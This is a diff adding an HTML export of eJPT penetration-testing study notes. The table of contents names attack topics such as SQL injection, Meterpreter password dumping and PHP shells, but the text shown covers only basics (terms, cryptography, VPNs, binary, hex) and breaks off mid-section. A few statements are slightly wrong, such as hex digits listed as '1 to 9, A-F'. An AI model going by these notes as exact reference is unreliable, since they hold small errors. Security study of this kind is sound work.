@@ -1,0 +1,2741 @@
+<!DOCTYPE html>
+    <html>
+    <head>
+        <meta charset="UTF-8">
+        <title>EJPT Cheat Sheet</title>
+        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.10.2/dist/katex.min.css" integrity="sha384-yFRtMMDnQtDRO8rLpMIKrtPCD5jdktao2TV19YiZYWMDkUR5GQZR/NOVTdquEx1j" crossorigin="anonymous">
+        <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Microsoft/vscode/extensions/markdown-language-features/media/markdown.css">
+        <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Microsoft/vscode/extensions/markdown-language-features/media/highlight.css">
+        <link href="https://cdn.jsdelivr.net/npm/katex-copytex@latest/dist/katex-copytex.min.css" rel="stylesheet" type="text/css">
+        <style>
+.task-list-item { list-style-type: none; } .task-list-item-checkbox { margin-left: -20px; vertical-align: middle; }
+</style>
+        <style>
+            body {
+                font-family: -apple-system, BlinkMacSystemFont, 'Segoe WPC', 'Segoe UI', 'Ubuntu', 'Droid Sans', sans-serif;
+                font-size: 14px;
+                line-height: 1.6;
+            }
+        </style>
+        
+        <script src="https://cdn.jsdelivr.net/npm/katex-copytex@latest/dist/katex-copytex.min.js"></script>
+    </head>
+    <body class="vscode-light">
+        <h1 id="ejpt-cheat-sheet">EJPT Cheat Sheet</h1>
+<ul>
+<li><a href="#ejpt-cheat-sheet">EJPT Cheat Sheet</a>
+<ul>
+<li><a href="#1-introduction">1 Introduction</a>
+<ul>
+<li><a href="#11-terms">1.1 Terms</a></li>
+<li><a href="#12-crytography">1.2 Crytography</a></li>
+<li><a href="#13-vpn">1.3 VPN</a></li>
+<li><a href="#14-binary-arithmethic-codes">1.4 Binary Arithmethic Codes</a>
+<ul>
+<li><a href="#141-binary-conversion">1.4.1 Binary Conversion</a></li>
+<li><a href="#142-logical-operators">1.4.2 Logical Operators</a></li>
+</ul>
+</li>
+<li><a href="#15-hexadecimal">1.5 Hexadecimal</a></li>
+</ul>
+</li>
+<li><a href="#2-networking">2 Networking</a>
+<ul>
+<li><a href="#21-protocols">2.1 Protocols</a>
+<ul>
+<li><a href="#211-packets">2.1.1 Packets</a></li>
+<li><a href="#212-protocol-layers">2.1.2 Protocol Layers</a></li>
+</ul>
+</li>
+<li><a href="#22-ip">2.2 IP</a>
+<ul>
+<li><a href="#221-ipmask">2.2.1 IP/Mask</a></li>
+<li><a href="#223-ipv6">2.2.3 IPv6</a></li>
+</ul>
+</li>
+<li><a href="#23-routing">2.3 Routing</a></li>
+<li><a href="#24-link-layer-devices-and-protocols">2.4 Link Layer Devices and Protocols</a>
+<ul>
+<li><a href="#241-switches">2.4.1 Switches</a></li>
+<li><a href="#242-forwarding-tables">2.4.2 Forwarding tables</a></li>
+<li><a href="#243-forwarding">2.4.3 Forwarding</a></li>
+<li><a href="#244-address-resolution-protocolarp">2.4.4 Address Resolution Protocol(ARP)</a></li>
+<li><a href="#245-hubs">2.4.5 Hubs</a></li>
+</ul>
+</li>
+<li><a href="#25-tpcudp">2.5 TPC/UDP</a>
+<ul>
+<li><a href="#251-ports">2.5.1 Ports</a></li>
+<li><a href="#252-tcp-and-udp-headers">2.5.2 TCP and UDP Headers</a></li>
+<li><a href="#253-tcp-three-way-handshake">2.5.3 TCP Three Way Handshake</a></li>
+</ul>
+</li>
+<li><a href="#26-firewalls-and-network-defence">2.6 Firewalls and Network Defence</a>
+<ul>
+<li><a href="#261-firewalls">2.6.1 Firewalls</a></li>
+</ul>
+</li>
+<li><a href="#27-dns">2.7 DNS</a></li>
+<li><a href="#28-wireshark">2.8 Wireshark</a>
+<ul>
+<li><a href="#nic-promiscuous-mode">NIC Promiscuous Mode</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><a href="#3-web-applications">3 Web Applications</a>
+<ul>
+<li><a href="#31-http">3.1 HTTP</a></li>
+<li><a href="#32-https">3.2 HTTPS</a></li>
+<li><a href="#33-http-cookies">3.3 HTTP Cookies</a>
+<ul>
+<li><a href="#331-cookie-domain">3.3.1 Cookie Domain</a></li>
+<li><a href="#332-cookie-expiration">3.3.2 Cookie Expiration</a></li>
+<li><a href="#333-cookie-http-only-attribute">3.3.3 Cookie Http-Only Attribute</a></li>
+<li><a href="#334-cookie-secure-attribute">3.3.4 Cookie Secure Attribute</a></li>
+<li><a href="#335-cookie-protocol">3.3.5 Cookie Protocol</a></li>
+</ul>
+</li>
+<li><a href="#34-sessions">3.4 Sessions</a>
+<ul>
+<li><a href="#35-same-origin-policy">3.5 Same Origin Policy</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><a href="#4-scripting">4 Scripting</a>
+<ul>
+<li><a href="#41-important-windows-commands">4.1 Important Windows Commands</a></li>
+</ul>
+</li>
+<li><a href="#5-information-gathering">5 Information Gathering</a>
+<ul>
+<li><a href="#51-open-source-intelligence">5.1 Open-Source Intelligence</a>
+<ul>
+<li><a href="#511-social-networks">5.1.1 Social Networks</a></li>
+<li><a href="#512-public-sites-information-gathering">5.1.2 Public Sites Information Gathering</a></li>
+<li><a href="#513-browsing-client%c2%b4s-sites">5.1.3 Browsing Client´s Sites</a></li>
+<li><a href="#514-email-patterns">5.1.4 Email Patterns</a></li>
+</ul>
+</li>
+<li><a href="#52-subdomain-enumeration">5.2 Subdomain Enumeration</a></li>
+</ul>
+</li>
+<li><a href="#6-footprinting-and-scanning">6 Footprinting and Scanning</a>
+<ul>
+<li><a href="#61-mapping-networks">6.1 Mapping Networks</a></li>
+<li><a href="#63-nmap-ping-scan">6.3 Nmap Ping Scan</a></li>
+<li><a href="#64-nmap-os-fingerprinting">6.4 nmap OS Fingerprinting</a></li>
+<li><a href="#65-nmap-port-scan">6.5 nmap Port Scan</a></li>
+<li><a href="#66-spotting-firewalls">6.6 Spotting Firewalls</a></li>
+<li><a href="#67-masscann">6.7 Masscann</a></li>
+</ul>
+</li>
+<li><a href="#7-vulnerability-assessment">7 Vulnerability Assessment</a>
+<ul>
+<li><a href="#71-vulnerability-scanner">7.1 Vulnerability Scanner</a></li>
+<li><a href="#72-nessus">7.2 Nessus</a></li>
+</ul>
+</li>
+<li><a href="#8-web-application-attacks">8 Web Application Attacks</a>
+<ul>
+<li><a href="#81-fingerprinting-web-servers">8.1 Fingerprinting Web Servers</a>
+<ul>
+<li><a href="#812-fingerprinting-with-netcat">8.1.2 Fingerprinting with Netcat</a></li>
+<li><a href="#813-fingerpriting-with-openssl">8.1.3 Fingerpriting with OpenSSL</a></li>
+<li><a href="#814-fingerprinting-with-httprint">8.1.4 Fingerprinting with Httprint</a></li>
+</ul>
+</li>
+<li><a href="#82-http-verbs">8.2 HTTP Verbs</a>
+<ul>
+<li><a href="#821-recap-of-http-verbs">8.2.1 Recap of HTTP verbs</a></li>
+<li><a href="#822-rest-apis">8.2.2 REST APIs</a></li>
+</ul>
+</li>
+<li><a href="#83-expoliting-misconfigured-http-verbs">8.3 Expoliting Misconfigured HTTP Verbs</a>
+<ul>
+<li><a href="#831-exploiting-put">8.3.1 Exploiting PUT</a></li>
+</ul>
+</li>
+<li><a href="#84-google-hacking">8.4 Google Hacking</a></li>
+<li><a href="#85-xss">8.5 XSS</a>
+<ul>
+<li><a href="#851-finding-xss">8.5.1 Finding XSS</a></li>
+<li><a href="#852-reflected-xss">8.5.2 Reflected XSS</a></li>
+<li><a href="#853-persistent-xss-attacks">8.5.3 Persistent XSS Attacks</a></li>
+</ul>
+</li>
+<li><a href="#86-sql-injections">8.6 SQL Injections</a>
+<ul>
+<li><a href="#861-sql-statements">8.6.1 SQL Statements</a></li>
+<li><a href="#862-sql-queries-inside-web-app">8.6.2 SQL Queries Inside Web App</a></li>
+<li><a href="#863-vulnerable-dynamic-queries">8.6.3 Vulnerable Dynamic Queries</a></li>
+<li><a href="#864-finding-sql-injections">8.6.4 Finding SQL Injections</a></li>
+<li><a href="#865-exploiting-boolean-based-sqli">8.6.5 Exploiting Boolean Based SQLi</a></li>
+<li><a href="#866-union-based-sql-injections">8.6.6 UNION Based SQL Injections</a></li>
+<li><a href="#866-sqlmap">8.6.6 SQLMap</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><a href="#9-system-attacks">9 System Attacks</a>
+<ul>
+<li><a href="#91-password-attacks">9.1 Password Attacks</a>
+<ul>
+<li><a href="#912-john-the-ripper">9.1.2 John the Ripper</a></li>
+<li><a href="#913-hashcat">9.1.3 Hashcat</a></li>
+<li><a href="#914-rainbow-tables">9.1.4 Rainbow Tables</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><a href="#10-network-attacks">10 Network Attacks</a>
+<ul>
+<li><a href="#101-authentication-cracking">10.1 Authentication Cracking</a>
+<ul>
+<li><a href="#1011-hydra">10.1.1 Hydra</a></li>
+</ul>
+</li>
+<li><a href="#102-windows-shares">10.2 Windows Shares</a>
+<ul>
+<li><a href="#1021-netbios">10.2.1 NetBIOS</a></li>
+<li><a href="#1022-shares">10.2.2 Shares</a></li>
+<li><a href="#1023-unc-path">10.2.3 UNC Path</a></li>
+<li><a href="#1024-admin-shares">10.2.4 Admin Shares</a></li>
+</ul>
+</li>
+<li><a href="#103-null-sessions">10.3 Null Sessions</a>
+<ul>
+<li><a href="#1031-enumerating-windows-shares-on-windows">10.3.1 Enumerating Windows Shares on Windows</a></li>
+</ul>
+</li>
+<li><a href="#1032-checking-for-null-sessions-on-windows">10.3.2 Checking for Null Sessions on Windows</a>
+<ul>
+<li><a href="#1033-exploiting-null-sessions-on-windows">10.3.3 Exploiting Null Sessions on Windows</a></li>
+<li><a href="#1034-enumerating-windows-shares-on-linux">10.3.4 Enumerating Windows Shares on Linux</a></li>
+<li><a href="#1035-checking-for-null-sessions-on-linux">10.3.5 Checking for Null Sessions on Linux</a></li>
+<li><a href="#1036-check-null-sessions-with-nmap">10.3.6 Check Null Sessions with Nmap</a></li>
+<li><a href="#1037-exploiting-null-sessions-on-linux">10.3.7 Exploiting Null Sessions on Linux</a></li>
+<li><a href="#1038-samrdump">10.3.8 Samrdump</a></li>
+<li><a href="#1039-nmap-smb-brute-force">10.3.9 Nmap smb Brute Force</a></li>
+</ul>
+</li>
+<li><a href="#104-arp-poisoning">10.4 ARP Poisoning</a>
+<ul>
+<li><a href="#1041-arpspoof">10.4.1 Arpspoof</a></li>
+</ul>
+</li>
+<li><a href="#105-metasploit">10.5 Metasploit</a></li>
+<li><a href="#106-meterpreter">10.6 Meterpreter</a>
+<ul>
+<li><a href="#1061-priviledge-escalation-in-meterpreter">10.6.1 Priviledge Escalation in Meterpreter</a></li>
+<li><a href="#1062-password-dumping-in-meterpreter">10.6.2 Password Dumping in Meterpreter</a></li>
+<li><a href="#1063-uploading-and-downloading-files-in-meterpreter">10.6.3 Uploading and Downloading Files in Meterpreter</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><a href="#11-rce-tips-and-tricks">11 RCE Tips and Tricks</a>
+<ul>
+<li><a href="#111-blind-injections">11.1 Blind Injections</a></li>
+<li><a href="#112-after-uploading-a-simple-non-interactive-php-shell">11.2 After Uploading a Simple Non-Interactive PHP Shell</a>
+<ul>
+<li><a href="#1121-identify-constraints">11.2.1 Identify constraints</a></li>
+<li><a href="#1122-trying-to-spawn-bash-on-connection">11.2.2 Trying to Spawn Bash on Connection</a></li>
+<li><a href="#1123-transferring-files-with-curl">11.2.3 Transferring Files with Curl</a></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h2 id="1-introduction">1 Introduction</h2>
+<h3 id="11-terms">1.1 Terms</h3>
+<ul>
+<li>White hat: Legal hacker</li>
+<li>Black hat: Illegal hacker</li>
+<li>User: A computer system user</li>
+<li>Malicous user: A user misusing systems and applications for attack</li>
+<li>Root/Admin: Users with maximum priviledge</li>
+<li>Security through obscurity: Security of design provide security</li>
+<li>Attack: Action aimed at misusing or taking control over a computer system</li>
+<li>Priviledge escalation: When a malicous user gains elevated priviledges over a system</li>
+<li>Dos: Denial of service</li>
+<li>RCE: Remote code execution</li>
+<li>Shellcode A custom code providing the attacker a shell on a victims machine</li>
+</ul>
+<h3 id="12-crytography">1.2 Crytography</h3>
+<ul>
+<li>
+<p>Clear text is data sent without any encryption</p>
+<ul>
+<li>Lets attacker eavesdrop</li>
+<li>Should not be used for critical or sensitive data</li>
+<li>If no other alternative, use only on trusted networks</li>
+</ul>
+</li>
+<li>
+<p>Cryptographic protocols encrypts the data</p>
+<ul>
+<li>Attackers are not able to eavesdrop</li>
+<li>Should always be used for sensitive or private data</li>
+</ul>
+</li>
+<li>
+<p>Use clear-text protocols on untrusted networks?</p>
+<ul>
+<li>Wrap(tunnel) a cleartext protocol into a cryptographic one</li>
+</ul>
+</li>
+</ul>
+<h3 id="13-vpn">1.3 VPN</h3>
+<ul>
+<li>Virtual private network</li>
+<li>Uses cryptography to extend private network over a public network
+<ul>
+<li>Client --(VPN)--) Internet --) Private network</li>
+</ul>
+</li>
+</ul>
+<h3 id="14-binary-arithmethic-codes">1.4 Binary Arithmethic Codes</h3>
+<h4 id="141-binary-conversion">1.4.1 Binary Conversion</h4>
+<ul>
+<li>
+<p>0 and 1</p>
+</li>
+<li>
+<p>1 + 1 = 10</p>
+</li>
+<li>
+<p>111 + 1 = 1000</p>
+</li>
+<li>
+<p>From decimal to and from binary:</p>
+<ul>
+<li><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mn>293</mn><mo>=</mo><mn>3</mn><mo>∗</mo><mn>1</mn><msup><mn>0</mn><mn>0</mn></msup><mo>+</mo><mn>9</mn><mo>∗</mo><mn>1</mn><msup><mn>0</mn><mn>1</mn></msup><mo>+</mo><mn>2</mn><mo>∗</mo><mn>1</mn><msup><mn>0</mn><mn>2</mn></msup></mrow><annotation encoding="application/x-tex">293 = 3*10^0 + 9*10^1 + 2*10^2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">2</span><span class="mord">9</span><span class="mord">3</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">3</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.897438em;vertical-align:-0.08333em;"></span><span class="mord">1</span><span class="mord"><span class="mord">0</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">9</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.897438em;vertical-align:-0.08333em;"></span><span class="mord">1</span><span class="mord"><span class="mord">0</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">2</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.8141079999999999em;vertical-align:0em;"></span><span class="mord">1</span><span class="mord"><span class="mord">0</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span></span></span></span></li>
+<li><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mn>1101</mn><mo>=</mo><mn>1</mn><mo>∗</mo><msup><mn>2</mn><mn>0</mn></msup><mo>+</mo><mn>0</mn><mo>∗</mo><msup><mn>2</mn><mn>1</mn></msup><mo>+</mo><mn>1</mn><mo>∗</mo><msup><mn>2</mn><mn>2</mn></msup><mo>+</mo><mn>1</mn><mo>∗</mo><msup><mn>2</mn><mn>3</mn></msup><mo>=</mo><mn>13</mn></mrow><annotation encoding="application/x-tex">1101 = 1*2^0 + 0*2^1 + 1*2^2 + 1*2^3 = 13</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span><span class="mord">1</span><span class="mord">0</span><span class="mord">1</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.897438em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">0</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.897438em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.897438em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.8141079999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span><span class="mord">3</span></span></span></span></li>
+<li>Divide by 2 and keep note of remainder</li>
+<li>Do the same with previous and keep note of remainder</li>
+<li>Do thid until remainder is 0</li>
+<li>What is 13?
+<ul>
+<li><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mn>13</mn><mi mathvariant="normal">/</mi><mn>2</mn><mo>=</mo><mn>6</mn></mrow><annotation encoding="application/x-tex">13/2 = 6</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mord">3</span><span class="mord">/</span><span class="mord">2</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">6</span></span></span></span> (1)</li>
+<li><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mn>6</mn><mi mathvariant="normal">/</mi><mn>2</mn><mo>=</mo><mn>3</mn></mrow><annotation encoding="application/x-tex">6/2  = 3</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">6</span><span class="mord">/</span><span class="mord">2</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">3</span></span></span></span> (0)</li>
+<li><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mn>3</mn><mi mathvariant="normal">/</mi><mn>2</mn><mo>=</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">3/2  = 1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">3</span><span class="mord">/</span><span class="mord">2</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span></span></span></span> (1)</li>
+<li><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mn>1</mn><mi mathvariant="normal">/</mi><mn>2</mn><mo>=</mo><mn>0</mn></mrow><annotation encoding="application/x-tex">1/2  = 0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mord">/</span><span class="mord">2</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">0</span></span></span></span> (1)</li>
+<li><strong>1101</strong></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h4 id="142-logical-operators">1.4.2 Logical Operators</h4>
+<ul>
+<li><strong>NOT</strong>
+<ul>
+<li>Flips bits</li>
+<li><strong>NOT</strong> 1101 = 0010</li>
+</ul>
+</li>
+<li><strong>AND</strong>
+<ul>
+<li>IF both bits are 1, resulting bit is 1. Otherwise 0</li>
+<li>1001 <strong>AND</strong> 1100 = 1000</li>
+</ul>
+</li>
+<li><strong>OR</strong>
+<ul>
+<li>If atleast one bit is 1, the resulting bit is 1</li>
+<li>1001 <strong>OR</strong> 1100 = 1101</li>
+</ul>
+</li>
+<li><strong>XOR</strong>
+<ul>
+<li>If just one of the bits are 1, resulting bit is 1</li>
+<li>1001 <strong>XOR</strong> 1100 = 0101</li>
+</ul>
+</li>
+</ul>
+<h3 id="15-hexadecimal">1.5 Hexadecimal</h3>
+<ul>
+<li>1 to 9, A-F</li>
+<li>Add 0x or h at the end to distinguish</li>
+<li>Converting hexadecimals to decimals:
+<ul>
+<li>0x3a1 = 0x(3101) = <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mn>1</mn><mo>∗</mo><mn>1</mn><msup><mn>6</mn><mn>0</mn></msup><mo>+</mo><mn>10</mn><mo>∗</mo><mn>1</mn><msup><mn>6</mn><mn>1</mn></msup><mo>+</mo><mn>3</mn><mo>∗</mo><mn>1</mn><msup><mn>6</mn><mn>2</mn></msup><mo>=</mo><mn>929</mn></mrow><annotation encoding="application/x-tex">1*16^0 + 10*16^1 + 3*16^2 = 929</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.897438em;vertical-align:-0.08333em;"></span><span class="mord">1</span><span class="mord"><span class="mord">6</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span><span class="mord">0</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.897438em;vertical-align:-0.08333em;"></span><span class="mord">1</span><span class="mord"><span class="mord">6</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">3</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.8141079999999999em;vertical-align:0em;"></span><span class="mord">1</span><span class="mord"><span class="mord">6</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">9</span><span class="mord">2</span><span class="mord">9</span></span></span></span></li>
+<li><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mn>1019</mn><mo>=</mo><mn>1019</mn><mi mathvariant="normal">/</mi><mn>16</mn><mo>=</mo><mn>63</mn><mo separator="true">,</mo><mn>6875</mn></mrow><annotation encoding="application/x-tex">1019 = 1019 / 16 = 63,6875</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span><span class="mord">0</span><span class="mord">1</span><span class="mord">9</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mord">0</span><span class="mord">1</span><span class="mord">9</span><span class="mord">/</span><span class="mord">1</span><span class="mord">6</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8388800000000001em;vertical-align:-0.19444em;"></span><span class="mord">6</span><span class="mord">3</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">6</span><span class="mord">8</span><span class="mord">7</span><span class="mord">5</span></span></span></span>
+<ul>
+<li><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mn>0</mn><mo separator="true">,</mo><mn>6875</mn><mo>∗</mo><mn>16</mn><mo>=</mo><mn>11</mn></mrow><annotation encoding="application/x-tex">0,6875*16 = 11</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8388800000000001em;vertical-align:-0.19444em;"></span><span class="mord">0</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">6</span><span class="mord">8</span><span class="mord">7</span><span class="mord">5</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span><span class="mord">6</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span 